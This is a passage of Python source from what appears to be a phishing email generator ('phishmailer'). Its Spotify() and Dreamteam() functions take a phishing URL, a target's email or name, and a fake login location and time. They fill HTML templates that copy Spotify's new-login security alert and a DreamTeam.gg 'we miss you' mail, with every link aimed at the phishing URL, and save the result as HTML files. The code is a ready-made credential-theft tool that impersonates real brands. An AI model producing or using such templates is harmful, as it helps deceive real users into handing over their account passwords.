	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #e1e7ea; border-radius: 3px; width: 36px;" role="presentation" border="0" width="36" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0; height: 36px; vertical-align: middle; width: 36px;" valign="middle" width="36" height="36"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none;" href="{}" target="_blank" rel="noopener"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; border-radius: 3px; display: block;" src="https://www.mailjet.com/images/theme/v1/icons/ico-social/twitter.png" alt="" width="36" height="36" /> </a></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 18px; color: #000000; font-size: 0px; padding: 0; padding-top: 10px; word-break: break-word;" align="right">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1; text-align: right; color: #000000;"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none; font-size: 12px; line-height: 18px; color: #0c6cf2;" href="{}">Click here to unsubscribe</a></div>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; margin: 0px auto; max-width: 600px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 0; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0; line-height: 0; text-align: left; display: inline-block; width: 100%; direction: ltr;">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 100%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; opacity: 0; font-size: 0px; padding: 0; word-break: break-word;" align="left">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</div>
	<p><img src="http://go.sparkpostmail2.com/q/p8QxVbauxOGxgZlFVbxAHQ~~/AAP1OAA~/RgRgcaotPlcDc3BjQgoAKi0lj17Xt8P6UhViaXprZW5AcHJvdG9ubWFpbC5jb21YBAAAAAA~" alt="" width="1" height="1" border="0" /></p>""".format(Url, Url, Url, Url, Url, Url, Url, Url))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")

	
def Spotify():
	Url = input(start + " Enter Your PhishingUrl: ")
	Email = input(start + " Enter Target Email: ")
	Country = input(start + " Enter Country: ")
	City = input(start + " Enter City: ")
	Date = input(start + " Enter Date: ")
	
	print("")
	print(start + " Enter Month When Login Happend")
	print(green + "[" + white + "1" + green + "]" + white + " January")
	print(green + "[" + white + "2" + green + "]" + white + " February")
	print(green + "[" + white + "3" + green + "]" + white + " March")
	print(green + "[" + white + "4" + green + "]" + white + " April")
	print(green + "[" + white + "5" + green + "]" + white + " May")
	print(green + "[" + white + "6" + green + "]" + white + " June")
	print(green + "[" + white + "7" + green + "]" + white + " July")
	print(green + "[" + white + "8" + green + "]" + white + " August")
	print(green + "[" + white + "9" + green + "]" + white + " September")
	print(green + "[" + white + "10" + green + "]" + white + " October")
	print(green + "[" + white + "11" + green + "]" + white + " November")
	print(green + "[" + white + "12" + green + "]" + white + " December")
	print("")
	monthpick = int(input(green + "root@phishmailer/month:~ " + white))
	month = monthName(monthpick)
	
	print("")
	Time = input(start + " Enter Time (example 11:45:17): ")
	
	source = ("""
	<div style="width: 100%!important; margin: 0; padding: 0;">
	<table style="width: 100%; max-width: 480px;" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
	<tbody>
	<tr>
	<td style="word-break: normal; border-collapse: collapse; font-family: 'Circular','Helvetica Neue',Helvetica,Arial,sans-serif; font-size: 12px; line-height: 18px; color: #555555;" align="left" valign="top"><center>
	<div>
	<table style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; width: 100%; height: 50px;" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px; height: 20px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 20px;" colspan="3" valign="middle" height="20">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle"><a style="border: none; margin: 0px; padding: 0px; text-decoration: none;" href="{}" target="_blank" rel="noopener"><img style="border: none; margin: 0px; padding: 0px; display: block; max-width: 100%; width: 122px; height: 37px;" src="https://message-editor.scdn.co/newsletters/b220713a2d4ac7a75ebe1f9ee0c78549.png" alt="" width="122" height="37" /></a></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 20px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 20px;" colspan="3" valign="middle" height="20">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table dir="ltr" style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; width: 100%;" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px; height: 28px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 28px;" colspan="3" valign="middle" height="28">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<h1 style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; text-decoration: none; color: #000000; font-size: 40px; font-weight: bold; line-height: 45px; letter-spacing: -0.04em; text-align: center;" align="center">New login on Spotify</h1>
	<h2 style="border: none; margin: 0px; padding: 7px 0px 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 17px; line-height: 23px; text-align: center;" align="center">We noticed a new login on your account, Here's the information:</h2>
	</td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 16px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 16px;" colspan="3" valign="middle" height="16">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; width: 100%;" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="width: 6.25%; border: none; margin: 0px; padding: 0px;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left"><strong style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; text-align: left; text-decoration: none; font-weight: bold;">Place/City/Country:</strong> {} {}</td>
	</tr>
	</tbody>
	</table>
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left"><strong style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; text-align: left; text-decoration: none; font-weight: bold;">Time:</strong> {} {}. 2021 {} CET</td>
	</tr>
	</tbody>
	</table>
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left">If you have signed in too your account lately you don't need to do anything right now.</td>
	</tr>
	</tbody>
	</table>
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left">If you don't recognize this login we recommend that you immediately <a style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; color: #1ed760;" href="{}" target="_blank" rel="noopener">Change your password</a> to keep you account safe.</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="width: 6.25%; border: none; margin: 0px; padding: 0px;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 20px;" colspan="3" valign="middle" height="20">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; width: 100%;" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="width: 6.25%; border: none; margin: 0px; padding: 0px;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left">Spotify-team</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="width: 6.25%; border: none; margin: 0px; padding: 0px;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 20px;" colspan="3" valign="middle" height="20">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; width: 100%;" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px; height: 22px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 22px;" colspan="3" valign="middle" height="22">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table dir="ltr" style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; background-color: #f7f7f7; width: 100%;" width="100%" cellspacing="0" cellpadding="0" bgcolor="#F7F7F7">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px; height: 25px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 25px;" colspan="3" valign="middle" height="25">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle"><img style="border: none; margin: 0px; padding: 0px; display: block; max-width: 100%; width: 77px; height: 23px;" src="https://message-editor.scdn.co/newsletter/images/logo_footer.png" alt="" width="77" height="23" /></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 25px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 25px;" colspan="3" valign="middle" height="25">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle"><hr style="border: none; margin: 0px; padding: 0px; background-color: #d1d5d9; height: 1px;" /></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 12px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 12px;" colspan="3" valign="middle" height="12">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-decoration: none; letter-spacing: 0.15px; color: #88898c; font-size: 11px; line-height: 1.65em; text-align: initial;" align="initial" valign="middle">Get Spotify for <a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">iPhone</a><span style="border-top: none; border-bottom: none; padding: 0px; width: 1px; border-left: 1px solid #c3c3c3; border-right: 1px solid transparent; display: inline-block; margin: 0px 7px;">&nbsp;</span><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">iPad</a><span style="border-top: none; border-bottom: none; padding: 0px; width: 1px; border-left: 1px solid #c3c3c3; border-right: 1px solid transparent; display: inline-block; margin: 0px 7px;">&nbsp;</span><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">Android</a><span style="border-top: none; border-bottom: none; padding: 0px; width: 1px; border-left: 1px solid #c3c3c3; border-right: 1px solid transparent; display: inline-block; margin: 0px 7px;">&nbsp;</span><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">Other</a></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 12px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 12px;" colspan="3" valign="middle" height="12">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle"><hr style="border: none; margin: 0px; padding: 0px; background-color: #d1d5d9; height: 1px;" /></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 25px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 25px;" colspan="3" valign="middle" height="25">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-decoration: none; letter-spacing: 0.15px; color: #88898c; font-size: 11px; line-height: 1.65em; text-align: initial;" align="initial" valign="middle">This message was sent to: <a href="mailto:{}" target="_blank" rel="noopener">{}</a>. If you got any questions or complains you can just<a style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; text-align: left; color: #6d6d6d; text-decoration: none; font-weight: bold;" href="{}" target="_blank" rel="noopener">Contact us</a>.</td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 33px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 33px;" colspan="3" valign="middle" height="33">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-decoration: none; letter-spacing: 0.15px; color: #88898c; line-height: 1.65em; text-align: initial; font-size: 11px;" align="initial" valign="middle"><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">Terms</a><span style="border-top: none; border-bottom: none; padding: 0px; width: 1px; border-left: 1px solid #c3c3c3; border-right: 1px solid transparent; display: inline-block; margin: 0px 7px;">&nbsp;</span><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">Privacy Policy</a><span style="border-top: none; border-bottom: none; padding: 0px; width: 1px; border-left: 1px solid #c3c3c3; border-right: 1px solid transparent; display: inline-block; margin: 0px 7px;">&nbsp;</span><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">Contact us</a></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 12px;" colspan="3" valign="middle" height="12">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-decoration: none; letter-spacing: 0.15px; color: #88898c; line-height: 1.65em; text-align: initial; font-size: 11px;" align="initial" valign="middle">Spotify AB, Regeringsgatan 19, 111 53, Stockholm, Sweden</td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 20px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 25px;" colspan="3" valign="middle" height="25">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</div>
	</center></td>
	</tr>
	</tbody>
	</table>
	<img style="height: 1px!important; width: 1px!important; border-width: 0!important; padding: 0!important; margin: 0!important;" src="https://wl.spotify.com/wf/open?upn=0dpejNnY-2BgnqNzu3QRLRQuYj-2FzVuoEfQZ-2FSq0xVDBdH7AxMPxte3HbMMrKoo2I2-2BMnKxsdIrz8NwnqWToXdYwmCHhKjbjW0yWYWuzpAfG2qjulQDDmEk-2Fbul2blqHURVftXBSW260JtpF2-2BMMh4aPge86DEa1jbCyO5AZTwvn7mnX-2Fh3v8zUGr5oFY2rXhYjDek0qGHK6RN0ruSPaltVdW5PtL7TG3DqkgxyvomFbmv5siHjTCFi0PVocOniz4yj9dQsrXGrAUJhHv-2BG-2BDndygDRdrBCpfOp0bebivpjp7AmBoCRSMGHgZKgF3XfXURNRaYeqp2gzD0jTY73dnOBOF4fI81XTjFfoCYYynez0jo-3D" alt="" width="1" height="1" border="0" /></div>""".format(Url, City, Country, Date, month, Time, Url, Url, Url, Url, Url, Email, Email, Url, Url, Url, Url,))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")

def Dreamteam():
	name = input(start + " Enter Target Name: ")
	Url = input(start + " Enter Your PhishingUrl: ")
	
	source = ("""
	<div style="padding:0;margin:0;border:0;width:100%;background-color:#16253d" cellspacing="0" cellpadding="0">
		<div style="display:none;max-height:0;overflow:hidden">♪~ ᕕ(ᐛ)ᕗ Swing by and see what you’ve missed ♪~ ᕕ(ᐛ)ᕗ
	</div>


		<table style="width:100%;border-collapse:collapse;border-spacing:0;padding:0;margin:0;border:0" cellspacing="0" cellpadding="0">
			<tbody><tr>
				<td style="background-color:#16253d">

					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:0px;padding-bottom:0px;padding-left:0;padding-right:0">
											<table valign="top" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="height:50px" height="50px"></td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>




					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:0px;padding-bottom:0px;padding-left:0;padding-right:0">
											<table style="width:100%" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="width:100%;text-align:center">
													   <img alt="Header" src="https://i.postimg.cc/nc7Pr5XH/top-_LOL1.png" style="width:100%;height:auto" width="600" align="middle">
													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#ffffff;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:45px;padding-bottom:15px;padding-left:50px;padding-right:50px">
											<table style="width:100%" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="padding:0 0 0">
														<div style="margin-right:auto;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;color:#444444;font-size:16px;line-height:1.3;max-width:600px;text-align:justify">What's up {},



																<br><br>We noticed that you haven’t been on DreamTeam.gg in the last two weeks. We can only assume you are somewhere on a beach relaxing.
																<br><br>Otherwise, we are starting to get nervous.
																<br><a target="_blank" style="color:#0077cc" href="{}">Log in</a> and <b>let us know everything is ok!</b>

														</div>

													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#ffffff;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:15px;padding-bottom:15px;padding-left:30px;padding-right:30px">
											<table style="width:100%" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td>
														<table style="margin:0 auto" cellspacing="0" cellpadding="0" border="0">
															<tbody><tr>
																<td> <a target="_blank" href="{}" style="display:table-cell;text-decoration:none;padding:12px 25px;font-size:17px;text-align:center;font-weight:bold;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;width:100%;color:#ffffff;border:0px solid;background-color:#041f3f;border-radius:100px"> LOG IN </a> </td>

															</tr>

														</tbody></table>

													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#ffffff;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:15px;padding-bottom:45px;padding-left:50px;padding-right:50px">
											<table style="width:100%" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="padding:0 0 0">
														<div style="margin-right:auto;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;color:#444444;font-size:16px;line-height:1.3;max-width:600px;text-align:justify">GL HF!

														</div>

													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#0e2846;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:0px;padding-bottom:0px;padding-left:0;padding-right:0">
											<table style="width:100%" valign="top" width="100%" cellspacing="0" cellpadding="0" border="0">

												<tbody><tr>
													<td></td>

													<td style="height:2px;width:600px;background-color:#00ccff" height="2px"></td>

													<td></td>

												</tr>

												<tr>
													<td></td>

													<td style="height:15px;width:600px"></td>

													<td></td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

